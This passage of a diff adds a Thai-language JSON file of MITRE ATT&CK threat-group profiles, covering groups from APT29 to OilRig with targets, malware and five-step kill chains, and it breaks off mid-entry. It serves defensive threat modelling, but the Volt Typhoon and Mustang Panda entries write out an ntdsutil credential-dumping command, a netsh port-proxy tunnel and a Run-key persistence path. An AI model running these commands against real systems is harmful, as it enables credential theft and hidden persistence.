@@ -1,0 +1,3054 @@
+{
+  "repository": "https://github.com/Mr-Green013/mitre-attack-playbooks",
+  "mitreVersion": "20.0",
+  "aptProfiles": {
+    "G0016": {
+      "id": "G0016",
+      "name": "APT29 (Cozy Bear / Midnight Blizzard / NOBELIUM)",
+      "origin": "Russia (SVR Foreign Intelligence Service)",
+      "category": "State-Sponsored Espionage",
+      "activeSince": "2008 – ปัจจุบัน",
+      "url": "https://attack.mitre.org/groups/G0016/",
+      "target": "หน่วยงานรัฐบาล, กระทรวงการต่างประเทศ, คลังสมอง (Think Tanks), ผู้ให้บริการ Cloud & IT Supply Chain (Microsoft 365 / Entra ID)",
+      "summary": "กลุ่มจารกรรมไซเบอร์ระดับสูงของหน่วยข่าวกรองต่างประเทศรัสเซีย (SVR) เชี่ยวชาญการแทรกซึมแบบไร้ร่องรอย (Stealth), การวางยา Supply Chain (C0024 SolarWinds SUNBURST), การปลอมแปลงโทเคนยืนยันตัวตน (Golden SAML / OAuth App Abuse) และการโจมตี Microsoft Teams Vishing",
+      "commStyle": "แอบอ้างเป็นทีม IT Security ผ่าน Microsoft Teams External Chat ล่อให้เป้าหมายกรอกรหัส Device Code Phishing หรือใช้บัญชีธุรกิจที่ยึดมาส่งลิงก์ OneDrive/PDF ที่ผ่านการเข้ารหัส",
+      "campaigns": [
+        "C0024 SolarWinds Compromise",
+        "C0023 Operation Ghost"
+      ],
+      "software": [
+        "S0559 SUNBURST",
+        "S0560 TEARDROP",
+        "S0567 GoldMax",
+        "S0154 Cobalt Strike",
+        "S0603 EnvyScout"
+      ],
+      "techniques": [
+        "T1595",
+        "T1588",
+        "T1566",
+        "T1195",
+        "T1059",
+        "T1078",
+        "T1098",
+        "T1027",
+        "T1003",
+        "T1552",
+        "T1606",
+        "T1087",
+        "T1021",
+        "T1114",
+        "T1560",
+        "T1071",
+        "T1041"
+      ],
+      "killChainSteps": [
+        {
+          "phase": "1. Initial Access",
+          "ttp": "T1195.002 / T1566.002",
+          "detail": "ฝัง Backdoor ในอัปเดตซอฟต์แวร์ (SolarWinds Orion SUNBURST) หรือทำ Password Spraying / Device Code Phishing เข้าสู่ Cloud Tenant"
+        },
+        {
+          "phase": "2. Execution & Persistence",
+          "ttp": "T1098.001 / T1671",
+          "detail": "เพิ่ม Client Secret/Certificate ใหม่ใน Entra ID Service Principal และผูกสิทธิ์ OAuth App (Mail.ReadWrite) เพื่อคงสิทธิ์ถาวร"
+        },
+        {
+          "phase": "3. Credential Access",
+          "ttp": "T1606.002 / T1003.006",
+          "detail": "ขโมยใบรับรอง ADFS Token-Signing เพื่อสร้างตั๋ว Golden SAML หรือรัน DCSync ดึงรหัสผ่านทั้งโดเมน"
+        },
+        {
+          "phase": "4. Stealth & Defense Impairment",
+          "ttp": "T1685.002 / T1027",
+          "detail": "ปิดหรือดัดแปลง Cloud Audit Logs, ตั้งชื่อโปรเซสและโดเมน C2 ให้ตรงกับโครงสร้างพื้นฐานขององค์กรเหยื่อ"
+        },
+        {
+          "phase": "5. Collection & Exfiltration",
+          "ttp": "T1114.002 / T1041",
+          "detail": "ดึงข้อมูลอีเมลของผู้บริหารและงานวิจัยด้านความมั่นคงผ่าน Microsoft Graph API แล้วส่งออกผ่าน HTTPS C2"
+        }
+      ]
+    },
+    "G0007": {
+      "id": "G0007",
+      "name": "APT28 (Fancy Bear / Forest Blizzard / Sofacy / GRU)",
+      "origin": "Russia (GRU Unit 26165)",
+      "category": "State-Sponsored Military Intelligence",
+      "activeSince": "2004 – ปัจจุบัน",
+      "url": "https://attack.mitre.org/groups/G0007/",
+      "target": "กระทรวงกลาโหม, กองทัพ, รัฐสภา, องค์กรพลังงาน, การบิน, สื่อมวลชน และโครงสร้างพื้นฐานโลจิสติกส์",
+      "summary": "หน่วยข่าวกรองทางทหารของรัสเซีย (GRU Unit 26165) มีความเชี่ยวชาญในการส่ง Spearphishing, การใช้ช่องโหว่ Zero-Day บน Webmail/Outlook/Edge Routers และการทำ Nearest Neighbor Wi-Fi Hopping (C0051)",
+      "commStyle": "ส่งอีเมล Spearphishing ที่อ้างอิงเหตุการณ์ความมั่นคงหรือเอกสารราชการจริง พร้อมแนบลิงก์ Credential Harvesting หรือใช้ช่องโหว่ปฏิทิน Outlook (CVE-2023-23397) ดึง Net-NTLMv2 Hash โดยเหยื่อไม่ต้องคลิก",
+      "campaigns": [
+        "C0051 APT28 Nearest Neighbor Campaign"
+      ],
+      "software": [
+        "S0045 Zebrocy",
+        "S0002 Mimikatz",
+        "S0148 X-Agent",
+        "S0363 Empire",
+        "GooseEgg"
+      ],
+      "techniques": [
+        "T1598",
+        "T1566",
+        "T1669",
+        "T1190",
+        "T1059",
+        "T1053",
+        "T1547",
+        "T1070",
+        "T1003",
+        "T1110",
+        "T1187",
+        "T1082",
+        "T1021",
+        "T1114",
+        "T1071"
+      ],
+      "killChainSteps": [
+        {
+          "phase": "1. Initial Access",
+          "ttp": "T1566.001 / T1669",
+          "detail": "ส่งอีเมล Spearphishing หรือเจาะเครือข่ายองค์กรข้างเคียงแล้วเชื่อมต่อเข้า Wi-Fi ของเป้าหมาย (C0051 Nearest Neighbor)"
+        },
+        {
+          "phase": "2. Forced Auth & Creds",
+          "ttp": "T1187 / T1110.003",
+          "detail": "บังคับให้เครื่องเหยื่อส่ง NTLM Hash ผ่าน UNC Path ไปยังเซิร์ฟเวอร์ WebDAV/SMB ของผู้โจมตีและทำ Password Spraying"
+        },
+        {
+          "phase": "3. Privilege Escalation",
+          "ttp": "T1068 / T1055",
+          "detail": "ยกระดับสิทธิ์ด้วยเครื่องมือ GooseEgg (ช่องโหว่ Windows Print Spooler driver) เพื่อขึ้นเป็น SYSTEM"
+        },
+        {
+          "phase": "4. Lateral Movement",
+          "ttp": "T1021.002 / T1053.005",
+          "detail": "สร้าง Scheduled Tasks และเคลื่อนย้ายข้ามเซิร์ฟเวอร์ผ่าน SMB/WinRM"
+        },
+        {
+          "phase": "5. Collection & Exfiltration",
+          "ttp": "T1114.003 / T1567.002",
+          "detail": "ตั้งกฎส่งต่ออีเมลและอัปโหลดเอกสารความลับออกไปยัง Cloud Storage"
+        }
+      ]
+    },
+    "G0032": {
+      "id": "G0032",
+      "name": "Lazarus Group (Diamond Sleet) & APT38 (G0082)",
+      "origin": "North Korea (RGB Reconnaissance General Bureau)",
+      "category": "State-Sponsored Espionage & Financial Heist",
+      "activeSince": "2009 – ปัจจุบัน",
+      "url": "https://attack.mitre.org/groups/G0032/",
+      "target": "ธนาคารและระบบ SWIFT, ตลาดแลกเปลี่ยน Cryptocurrency, บริษัทพัฒนาซอฟต์แวร์, อุตสาหกรรมป้องกันประเทศและเซมิคอนดักเตอร์",
+      "summary": "กลุ่มปฏิบัติการหลักของเกาหลีเหนือที่ควบคู่ทั้งการจารกรรมระดับชาติและการปล้นสินทรัพย์ดิจิทัล/ธนาคาร (APT38) เชี่ยวชาญการหลอกสัมภาษณ์งานสาย Tech (Operation Dream Job C0022) และการโจมตี Software Supply Chain (3CX C0057)",
+      "commStyle": "สวมรอยเป็น Headhunter / Senior Tech Recruiter บน LinkedIn และ GitHub ทักแชตชวนวิศวกรสัมภาษณ์งานเงินเดือนสูง แล้วส่งไฟล์โจทย์ทดสอบเขียนโค้ด (Trojanized PDF/ZIP/GitHub Repo) ให้รันบนเครื่องทำงาน",
+      "campaigns": [
+        "C0022 Operation Dream Job",
+        "C0057 3CX Supply Chain Attack",
+        "C0006 Operation Honeybee"
+      ],
+      "software": [
+        "S1070 APPLEJEUS",
+        "S0446 MagicRAT",
+        "S0692 BlindingCan",
+        "S0139 WannaCry",
+        "S0670 Dtrack"
+      ],
+      "techniques": [
+        "T1589",
+        "T1587",
+        "T1566",
+        "T1195",
+        "T1204",
+        "T1059",
+        "T1055",
+        "T1574",
+        "T1027",
+        "T1003",
+        "T1082",
+        "T1021",
+        "T1071",
+        "T1485",
+        "T1486"
+      ],
+      "killChainSteps": [
+        {
+          "phase": "1. Social Engineering Lure",
+          "ttp": "T1598.001 / T1566.003",
+          "detail": "ทักแชตผ่าน LinkedIn/Telegram ในแคมเปญ Operation Dream Job (C0022) ส่งไฟล์งานปลอมหรือซอฟต์แวร์คริปโตฝังโทรจัน (APPLEJEUS)"
+        },
+        {
+          "phase": "2. Execution & DLL Sideloading",
+          "ttp": "T1574.001 / T1218.011",
+          "detail": "ใช้เทคนิค DLL Search Order Hijacking อาศัยโปรแกรมที่มีใบรับรองถูกต้องโหลดโค้ดอันตรายเข้าสู่หน่วยความจำ"
+        },
+        {
+          "phase": "3. Credential Theft",
+          "ttp": "T1555.003 / T1552.004",
+          "detail": "ดึงรหัสผ่านจากเบราว์เซอร์, ไฟล์ .env, SSH Private Keys และคุกกี้เข้าถึงระบบ Cloud/Crypto Wallet"
+        },
+        {
+          "phase": "4. Lateral Movement",
+          "ttp": "T1021.001 / T1021.004",
+          "detail": "เคลื่อนย้ายผ่าน SSH และ RDP เข้าสู่เซิร์ฟเวอร์ Build Pipeline หรือเซิร์ฟเวอร์ธุรกรรมการเงิน"
+        },
+        {
+          "phase": "5. Impact / Heist",
+          "ttp": "T1657 / T1485",
+          "detail": "โอนถ่ายสินทรัพย์ดิจิทัล/การเงิน (Financial Theft) และปล่อย Wiper ลบข้อมูลเพื่อทำลายหลักฐาน"
+        }
+      ]
+    },
+    "G1052": {
+      "id": "G1052",
+      "name": "Contagious Interview (DeceptiveDevelopment / DEV#POPPER)",
+      "origin": "North Korea",
+      "category": "Developer-Targeted Espionage & Crypto Theft",
+      "activeSince": "2023 – ปัจจุบัน",
+      "url": "https://attack.mitre.org/groups/G1052/",
+      "target": "นักพัฒนาซอฟต์แวร์ Full-Stack, วิศวกร Web3 / Blockchain, DevOps และบริษัทเทคโนโลยีทั่วโลก",
+      "summary": "กลุ่มภัยคุกคามเกาหลีเหนือยุคใหม่ที่มุ่งเป้าเจาะเครื่องนักพัฒนาซอฟต์แวร์โดยเฉพาะผ่านการสัมภาษณ์งานออนไลน์ปลอม โดยหลอกให้ git clone และรันโปรเจกต์ Node.js/Python/React ที่ฝังมัลแวร์ BeaverTail และ InvisibleFerret",
+      "commStyle": "พูดคุยเป็นกันเองเหมือน CTO หรือ Tech Lead ของสตาร์ทอัพ Web3/AI ขอให้ผู้สมัครแก้โจทย์ Bug เล็กๆ ใน GitHub/Bitbucket Repo ภายใน 30 นาที หรือแจ้งว่ากล้อง/ไมค์ในระบบประชุมไม่ทำงานเพื่อให้รันสคริปต์แก้ไข",
+      "campaigns": [
+        "C0022 Operation Dream Job (Modern Dev Variant)"
+      ],
+      "software": [
+        "BeaverTail (JS InfoStealer)",
+        "InvisibleFerret (Python RAT)",
+        "AnyDesk"
+      ],
+      "techniques": [
+        "T1585",
+        "T1683",
+        "T1566",
+        "T1204",
+        "T1059",
+        "T1546",
+        "T1555",
+        "T1539",
+        "T1219",
+        "T1071",
+        "T1567"
+      ],
+      "killChainSteps": [
+        {
+          "phase": "1. Fake Job Interview",
+          "ttp": "T1585.001 / T1683.001",
+          "detail": "สร้างโปรไฟล์บริษัทปลอมบน LinkedIn และทักชวนนักพัฒนาทำแบบทดสอบ Technical Assessment"
+        },
+        {
+          "phase": "2. Malicious Repo Execution",
+          "ttp": "T1204.005 / T1059.007",
+          "detail": "เหยื่อรัน npm install / npm start บนโปรเจกต์ทดสอบ ซึ่งมีโค้ด JavaScript ที่ถูกพรางตัว (BeaverTail) ทำงานเบื้องหลัง"
+        },
+        {
+          "phase": "3. Second-Stage Python RAT",
+          "ttp": "T1059.006 / T1105",
+          "detail": "BeaverTail ดาวน์โหลด Python portable environment พร้อมรัน InvisibleFerret backdoor ข้ามแพลตฟอร์ม (Windows/macOS/Linux)"
+        },
+        {
+          "phase": "4. Credential & Wallet Harvesting",
+          "ttp": "T1555.003 / T1552.001",
+          "detail": "กวาดข้อมูล Browser Login Data, ส่วนขยายกระเป๋าคริปโต (MetaMask/Phantom), macOS Keychain และไฟล์ .env / SSH Keys"
+        },
+        {
+          "phase": "5. Remote Persistence",
+          "ttp": "T1219.002 / T1041",
+          "detail": "แอบติดตั้งสคริปต์ควบคุมระยะไกลและส่งออกซอร์สโค้ดรวมถึงคีย์ลับทั้งหมดไปยังเซิร์ฟเวอร์ C2"
+        }
+      ]
+    },
+    "G0034": {
+      "id": "G0034",
+      "name": "Sandworm Team (APT44 / Seashell Blizzard / Voodoo Bear)",
+      "origin": "Russia (GRU Unit 74455)",
+      "category": "Destructive Cyber Warfare & ICS/OT Sabotage",
+      "activeSince": "2009 – ปัจจุบัน",
+      "url": "https://attack.mitre.org/groups/G0034/",
+      "target": "โรงไฟฟ้าและโครงข่ายพลังงาน (Power Grid), ระบบน้ำประปาและระบบทำความร้อน, โทรคมนาคม, หน่วยงานรัฐ และระบบควบคุมอุตสาหกรรม (ICS/OT)",
+      "summary": "หน่วยปฏิบัติการสงครามไซเบอร์เชิงทำลายล้างของ GRU Unit 74455 ผู้อยู่เบื้องหลังการตัดกระแสไฟฟ้าในยูเครน (2015 C0028, 2016 C0025, 2022 C0034), มัลแวร์ล้างโลก NotPetya และแคมเปญ Wiper โจมตีโครงสร้างพื้นฐานในยุโรป",
+      "commStyle": "เน้นปฏิบัติการทำลายล้างแบบไร้การเจรจา (No-negotiation Wiper / Fake Ransomware) และใช้ช่องทาง Telegram Hacktivist Persona บังหน้าในการประกาศความรับผิดชอบเพื่อสร้างผลกระทบทางจิตวิทยา",
+      "campaigns": [
+        "C0028 2015 Ukraine Electric Power Attack",
+        "C0025 2016 Ukraine Electric Power Attack",
+        "C0034 2022 Ukraine Electric Power Attack",
+        "C0063 2025 Poland Wiper Attacks"
+      ],
+      "software": [
+        "S0604 Industroyer / Industroyer2",
+        "S0368 NotPetya",
+        "S0693 CaddyWiper",
+        "S0089 BlackEnergy",
+        "S0691 AwfulShred"
+      ],
+      "techniques": [
+        "T1190",
+        "T1133",
+        "T1078",
+        "T1059",
+        "T1505",
+        "T1053",
+        "T1070",
+        "T1003",
+        "T1046",
+        "T1021",
+        "T1485",
+        "T1486",
+        "T1561",
+        "T0836",
+        "T1692",
+        "T0813"
+      ],
+      "killChainSteps": [
+        {
+          "phase": "1. IT Perimeter Breach",
+          "ttp": "T1190 / T1505.003",
+          "detail": "เจาะช่องโหว่ Edge Appliance หรือวาง Web Shell (Neo-REGEORG) บนเซิร์ฟเวอร์ที่เชื่อมต่ออินเทอร์เน็ต"
+        },
+        {
+          "phase": "2. IT-to-OT Pivot",
+          "ttp": "T1078 / T0886",
+          "detail": "ขโมยรหัสผ่านจาก Active Directory แล้วกระโดดข้าม Jump Host เข้าสู่โซน OT / SCADA Control Center"
+        },
+        {
+          "phase": "3. ICS Protocol Manipulation",
+          "ttp": "T0836 / T1692.001",
+          "detail": "ใช้ Industroyer2 ส่งคำสั่งโปรโตคอล IEC 60870-5-104 / Modbus / OPC สั่งเปิดเบรกเกอร์สถานีไฟฟ้าย่อยโดยตรง"
+        },
+        {
+          "phase": "4. Inhibit Response Function",
+          "ttp": "T0878 / T1695.001",
+          "detail": "ตัดช่องทางสื่อสาร Serial COM / Ethernet และปิดระบบแจ้งเตือนบนหน้าจอ HMI เพื่อถ่วงเวลาการกู้คืนของวิศวกร"
+        },
+        {
+          "phase": "5. Multi-Platform Data Wipe",
+          "ttp": "T1561.002 / T0809",
+          "detail": "ปล่อย CaddyWiper (Windows) และ AwfulShred (Linux/Solaris) ลบดิสก์เซิร์ฟเวอร์ทั้งหมดพร้อมกันผ่าน GPO"
+        }
+      ]
+    },
+    "G1017": {
+      "id": "G1017",
+      "name": "Volt Typhoon (BRONZE SILHOUETTE / Vanguard Panda)",
+      "origin": "China (PRC State-Sponsored)",
+      "category": "Critical Infrastructure Pre-Positioning & Living-off-the-Land",
+      "activeSince": "2021 – ปัจจุบัน",
+      "url": "https://attack.mitre.org/groups/G1017/",
+      "target": "โครงสร้างพื้นฐานสำคัญระดับชาติ (พลังงาน, น้ำประปา, คมนาคม, ท่าเรือ, โทรคมนาคม และฐานทัพ)",
+      "summary": "กลุ่มผู้โจมตีที่เน้นการฝังตัวระยะยาวในโครงสร้างพื้นฐานสำคัญโดยแทบไม่ใช้มัลแวร์เลย (100% Living-off-the-Land / LOTL) อาศัยการยึดเราเตอร์ SOHO มาทำเป็นเครือข่าย Proxy (KV Botnet C0035) เพื่อกลืนไปกับทราฟฟิกปกติ",
+      "commStyle": "ไม่มีการติดต่อสื่อสารกับเหยื่อเลย ทุกคำสั่งรันผ่าน CLI มาตรฐานของระบบ (`wmic`, `ntdsutil`, `netsh`, `powershell`) ผ่านท่อ Proxy ของอุปกรณ์เครือข่ายในประเทศเดียวกัน",
+      "campaigns": [
+        "C0035 KV Botnet Activity",
+        "C0039 Versa Director Zero Day Exploitation"
+      ],
+      "software": [
+        "S0002 Mimikatz",
+        "Impacket",
+        "FRP (Fast Reverse Proxy)",
+        "Native Windows LOTL Binaries"
+      ],
+      "techniques": [
+        "T1584",
+        "T1190",
+        "T1133",
+        "T1078",
+        "T1059",
+        "T1047",
+        "T1505",
+        "T1070",
+        "T1685",
+        "T1003",
+        "T1087",
+        "T1018",
+        "T1021",
+        "T1090"
+      ],
+      "killChainSteps": [
+        {
+          "phase": "1. Operational Relay Box (ORB)",
+          "ttp": "T1584.008 / T1090.003",
+          "detail": "ยึดเราเตอร์และไฟร์วอลล์ที่หมดอายุการสนับสนุน (KV Botnet) เพื่อใช้เป็น Multi-hop Proxy ซ่อน IP ต้นทาง"
+        },
+        {
+          "phase": "2. Edge Appliance Exploit",
+          "ttp": "T1190 / T1133",
+          "detail": "เจาะช่องโหว่ Zero-Day บนระบบ VPN/Firewall/SD-WAN (เช่น Fortinet, Ivanti, Citrix, Versa Director)"
+        },
+        {
+          "phase": "3. NTDS.dit Credential Extraction",
+          "ttp": "T1003.003 / T1047",
+          "detail": "ใช้คำสั่ง `wmic` และ `ntdsutil.exe \"ac i ntds\" \"ifm\"` สร้างสำเนาฐานข้อมูล Active Directory เพื่อดึงรหัสผ่านทุกบัญชี"
+        },
+        {
+          "phase": "4. Portproxy LOTL Tunneling",
+          "ttp": "T1090.001 / T1021.001",
+          "detail": "รันคำสั่ง `netsh interface portproxy add v4tov4` บนเซิร์ฟเวอร์ภายในเพื่อส่งต่อทราฟฟิก RDP/SMB เข้าสู่โซนควบคุม OT"
+        },
+        {
+          "phase": "5. Selective Log Clearing",
+          "ttp": "T1685.005 / T1070.003",
+          "detail": "ลบเฉพาะบรรทัด Event Log และประวัติคำสั่งที่เกี่ยวข้องกับการล็อกอินของตนเพื่อรักษาการฝังตัวนานหลายปี"
+        }
+      ]
+    },
+    "G1045": {
+      "id": "G1045",
+      "name": "Salt Typhoon (GhostEmperor / FamousSparrow Nexus)",
+      "origin": "China (PRC State-Sponsored)",
+      "category": "Telecommunications & Core Router Espionage",
+      "activeSince": "2019 – ปัจจุบัน",
+      "url": "https://attack.mitre.org/groups/G1045/",
+      "target": "ผู้ให้บริการโทรคมนาคมระดับประเทศ (ISP / Telecom Carriers), โครงข่าย Core Router และระบบดักฟังตามกฎหมาย",
+      "summary": "กลุ่มจารกรรมระดับสูงที่มุ่งเจาะโครงสร้างพื้นฐานของผู้ให้บริการอินเทอร์เน็ตและโทรคมนาคม โดยเข้าควบคุม Core Routers / Switches เพื่อดักจับข้อมูลทราฟฟิกและเมทาดาทาการสื่อสาร",
+      "commStyle": "ฝังตัวเงียบในระดับ Firmware/IOS ของเราเตอร์และสวิตช์หลัก ใช้พอร์ตบริหารจัดการและแก้ไขตาราง Routing/SPAN เพื่อคัดลอกทราฟฟิกออกไปโดยไม่กระทบความเร็วเครือข่าย",
+      "campaigns": [
+        "C0050 J-magic Campaign",
+        "C0046 ArcaneDoor"
+      ],
+      "software": [
+        "J-magic (cd00r BPF Backdoor)",
+        "Demodex Rootkit",
+        "GhostSpider"
+      ],
+      "techniques": [
+        "T1190",
+        "T1078",
+        "T1059",
+        "T1601",
+        "T1556",
+        "T1205",
+        "T1040",
+        "T1602",
+        "T1098",
+        "T1020",
+        "T1573"
+      ],
+      "killChainSteps": [
+        {
+          "phase": "1. Network Edge Compromise",
+          "ttp": "T1190 / T1078",
+          "detail": "เจาะอุปกรณ์เครือข่ายและเซิร์ฟเวอร์บริหารจัดการของค่ายโทรคมนาคม"
+        },
+        {
+          "phase": "2. Passive BPF Backdoor",
+          "ttp": "T1205.002 / T1014",
+          "detail": "ติดตั้ง Backdoor ที่ใช้ Socket Filters (eBPF / cd00r) รอรับ Magic Packet พิเศษก่อนเปิดเชลล์โดยไม่เปิดพอร์ตค้างไว้"
+        },
+        {
+          "phase": "3. TACACS+ / RADIUS Sniffing",
+          "ttp": "T1040 / T1552.004",
+          "detail": "ดักฟังข้อมูลรับรองของวิศวกรเครือข่ายและดึงคอนฟิกจากอุปกรณ์ผ่าน SNMP/CLI (T1602.002)"
+        },
+        {
+          "phase": "4. System Image Modification",
+          "ttp": "T1601.001 / T1098.004",
+          "detail": "แก้ไขไฟล์อิมเมจของอุปกรณ์เครือข่ายและฝังคีย์ SSH เพื่อคงสิทธิ์แม้มีการรีบูต"
+        },
+        {
+          "phase": "5. Traffic Duplication Exfil",
+          "ttp": "T1020.001",
+          "detail": "ตั้งค่าพอร์ต Mirror / GRE Tunnel เพื่อส่งสำเนาทราฟฟิกเป้าหมายออกไปยังโหนดรวบรวมข้อมูล"
+        }
+      ]
+    },
+    "G0096": {
+      "id": "G0096",
+      "name": "APT41 (Wicked Panda / Brass Typhoon / BARIUM)",
+      "origin": "China",
+      "category": "Dual Espionage & Financially Motivated Operations",
+      "activeSince": "2012 – ปัจจุบัน",
+      "url": "https://attack.mitre.org/groups/G0096/",
+      "target": "โทรคมนาคม, ยาและสาธารณสุข, เซมิคอนดักเตอร์, บริษัทพัฒนาเกมออนไลน์, โลจิสติกส์ และการบิน",
+      "summary": "กลุ่มภัยคุกคามสองบทบาทที่ทำงานจารกรรมข้อมูลเทคโนโลยีในเวลากลางวัน และปฏิบัติการโจมตีเพื่อผลประโยชน์ทางการเงิน (เช่น ขโมยใบรับรอง Code Signing และสกุลเงินในเกม) ในเวลากลางคืน",
+      "commStyle": "ส่ง Spearphishing ที่ปรับแต่งเนื้อหาเฉพาะองค์กร หรือแทรกซึมผ่านระบบอัปเดตซอฟต์แวร์พร้อมใช้ใบรับรองดิจิทัลที่ขโมยมาเซ็นกำกับมัลแวร์",
+      "campaigns": [
+        "C0040 APT41 DUST",
+        "C0017 U.S. State Government Intrusions"
+      ],
+      "software": [
+        "S0448 ShadowPad",
+        "S0154 Cobalt Strike",
+        "S0013 PlugX",
+        "DustPan",
+        "DustTrap"
+      ],
+      "techniques": [
+        "T1190",
+        "T1195",
+        "T1566",
+        "T1059",
+        "T1574",
+        "T1553",
+        "T1055",
+        "T1003",
+        "T1021",
+        "T1071",
+        "T1102",
+        "T1567"
+      ],
+      "killChainSteps": [
+        {
+          "phase": "1. Public Web App Exploit",
+          "ttp": "T1190",
+          "detail": "ใช้ช่องโหว่ SQL Injection, Deserialization หรือ RCE บนเว็บแอปพลิเคชันขององค์กรเพื่อวาง Web Shell"
+        },
+        {
+          "phase": "2. Signed Loader & DLL Hijack",
+          "ttp": "T1553.002 / T1574.001",
+          "detail": "วางไฟล์ไบนารีถูกต้องที่มีใบรับรองดิจิทัลคู่กับไฟล์ DLL อันตราย (ShadowPad / DustPan) เพื่อโหลดเข้าหน่วยความจำ"
+        },
+        {
+          "phase": "3. Kernel Rootkit & Stealth",
+          "ttp": "T1014 / T1055.012",
+          "detail": "ติดตั้งไดรเวอร์ระดับ Kernel หรือทำ Process Hollowing ซ่อนตัวใน `svchost.exe`"
+        },
+        {
+          "phase": "4. Cloud Web Service C2",
+          "ttp": "T1102.002 / T1071.004",
+          "detail": "ใช้ Google Workspace, Cloudflare Workers และ DNS Tunneling เป็นช่องทางควบคุม C2 (แคมเปญ APT41 DUST C0040)"
+        },
+        {
+          "phase": "5. Intellectual Property Theft",
+          "ttp": "T1560.001 / T1567.002",
+          "detail": "บีบอัดซอร์สโค้ดและฐานข้อมูลวิจัยแล้วอัปโหลดออกไปยัง Cloud Storage"
+        }
+      ]
+    },
+    "G0129": {
+      "id": "G0129",
+      "name": "Mustang Panda ( Earth Preta / Bronze President / Stately Taurus )",
+      "origin": "China",
+      "category": "Regional Cyber Espionage (ASEAN & Europe Focus)",
+      "activeSince": "2012 – ปัจจุบัน",
+      "url": "https://attack.mitre.org/groups/G0129/",
+      "target": "หน่วยงานภาครัฐในเอเชียตะวันออกเฉียงใต้ (ASEAN), สถานทูต, องค์กรความร่วมมือระหว่างประเทศ และสถาบันวิจัย",
+      "summary": "กลุ่มจารกรรมไซเบอร์ที่เคลื่อนไหวอย่างหนักในภูมิภาคเอเชียตะวันออกเฉียงใต้และยุโรป มีเอกลักษณ์คือการใช้เอกสารล่อเหยื่อเรื่องการประชุมอาเซียน/นโยบายรัฐ ควบคู่กับการแพร่กระจายผ่าน USB Flash Drive และมัลแวร์ตระกูล PlugX / ToneShell",
+      "commStyle": "ส่งอีเมลแนบลิงก์ Google Drive / Dropbox ที่โหลดไฟล์ `.zip` หรือ `.iso` ข้างในมีไฟล์ทางลัด `.lnk` ตั้งชื่อเป็นวาระการประชุมระดับภูมิภาค เมื่อคลิกจะเปิดเอกสารจริงขึ้นบังหน้าพร้อมแอบรัน PlugX เบื้องหลัง",
+      "campaigns": [
+        "C0047 RedDelta Modified PlugX Infection Chain Operations"
+      ],
+      "software": [
+        "S0013 PlugX (Korplug)",
+        "S1139 ToneShell",
+        "PUBLOAD",
+        "SmugX"
+      ],
+      "techniques": [
+        "T1566",
+        "T1091",
+        "T1204",
+        "T1059",
+        "T1547",
+        "T1574",
+        "T1027",
+        "T1564",
+        "T1005",
+        "T1560",
+        "T1071",
+        "T1567"
+      ],
+      "killChainSteps": [
+        {
+          "phase": "1. Diplomatic Lure & USB Worm",
+          "ttp": "T1566.002 / T1091",
+          "detail": "ส่งลิงก์ดาวน์โหลดไฟล์ Archive (`.iso`/`.zip`) หรือแพร่กระจายผ่าน USB Drive ที่ซ่อนไฟล์จริงไว้ในโฟลเดอร์ Hidden"
+        },
+        {
+          "phase": "2. DLL Side-Loading (Triad)",
+          "ttp": "T1574.001 / T1564.001",
+          "detail": "ใช้ชุดไฟล์ 3 ชิ้น (ไฟล์ `.exe` ที่เซ็นชื่อถูกต้อง + ไฟล์ `.dll` โหลดเดอร์ + ไฟล์ข้อมูลเข้ารหัส `.dat`) เพื่อรัน PlugX หรือ ToneShell"
+        },
+        {
+          "phase": "3. Registry Persistence",
+          "ttp": "T1547.001",
+          "detail": "สร้างคีย์ใน `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` ให้ทำงานทุกครั้งที่เปิดเครื่อง"
+        },
+        {
+          "phase": "4. Automated Document Staging",
+          "ttp": "T1119 / T1560.001",
+          "detail": "สแกนหาไฟล์ `.doc`, `.docx`, `.pdf`, `.xls` ทั้งเครื่องและในไดรฟ์แชร์ แล้วบีบอัดด้วย `rar.exe` แบบแบ่งพาร์ต"
+        },
+        {
+          "phase": "5. Custom TLS C2 Exfiltration",
+          "ttp": "T1071.001 / T1573",
+          "detail": "ส่งไฟล์เอกสารออกผ่านทราฟฟิก HTTPS ที่ปลอมแปลงส่วนหัว (Fake TLS Handshake)"
+        }
+      ]
+    },
+    "G0049": {
+      "id": "G0049",
+      "name": "OilRig (APT34 / Hazel Sandstorm) & MuddyWater (G0069)",
+      "origin": "Iran (MOIS)",
+      "category": "Middle East & Global Critical Sector Espionage",
+      "activeSince": "2014 – ปัจจุบัน",
+      "url": "https://attack.mitre.org/groups/G0049/",
+      "target": "พลังงานและปิโตรเคมี, โทรคมนาคม, ธนาคาร, หน่วยงานรัฐบาล และระบบสาธารณูปโภค",
+      "summary": "กลุ่มปฏิบัติการหลักของอิหร่านที่เชี่ยวชาญการเจาะเซิร์ฟเวอร์ Microsoft Exchange, การใช้ DNS Tunneling / อีเมลเป็นช่องทาง C2 และการนำซอฟต์แวร์ RMM สำเร็จรูป (SimpleHelp, Atera, ScreenConnect) มาใช้ควบคุมเครื่องเหยื่อ",
+      "commStyle": "ส่งอีเมล Phishing แนบลิงก์ OneDrive/SharePoint ที่ชี้ไปยังสคริปต์ติดตั้งโปรแกรมรีโมต RMM ของแท้ เพื่อให้ฝ่าย IT เข้าใจผิดคิดว่าเป็นเครื่องมือช่วยเหลือทางไกลปกติ",
+      "campaigns": [
+        "C0044 Juicy Mix",
+        "C0042 Outer Space"
+      ],
+      "software": [
+        "S0138 POWRUNER",
+        "S0252 BONDUPDATER",
+        "Mango Backdoor",
+        "Atera / SimpleHelp RMM"
+      ],
+      "techniques": [
+        "T1566",
+        "T1190",
+        "T1059",
+        "T1053",
+        "T1505",
+        "T1219",
+        "T1003",
+        "T1114",
+        "T1071",
+        "T1567"
+      ],
+      "killChainSteps": [
+        {
+          "phase": "1. Exchange Exploit / Spearphish",
+          "ttp": "T1190 / T1566.001",
+          "detail": "เจาะเซิร์ฟเวอร์อีเมลหรือส่งไฟล์แนบที่เรียกใช้งาน PowerShell/VBScript"
+        },
+        {
+          "phase": "2. Legitimate RMM Deployment",
+          "ttp": "T1219.002 / T1053.005",
+          "detail": "ติดตั้งโปรแกรมรีโมตถูกต้องตามกฎหมาย (SimpleHelp / Atera) หรือตั้ง Scheduled Task รันสคริปต์ทุกไม่กี่นาที"
+        },
+        {
+          "phase": "3. Credential Harvesting",
+          "ttp": "T1003.001 / T1555.003",
+          "detail": "ดึงรหัสผ่านจากหน่วยความจำ LSASS และฐานข้อมูลรหัสผ่านของเบราว์เซอร์"
+        },
+        {
+          "phase": "4. DNS & Email C2 Channel",
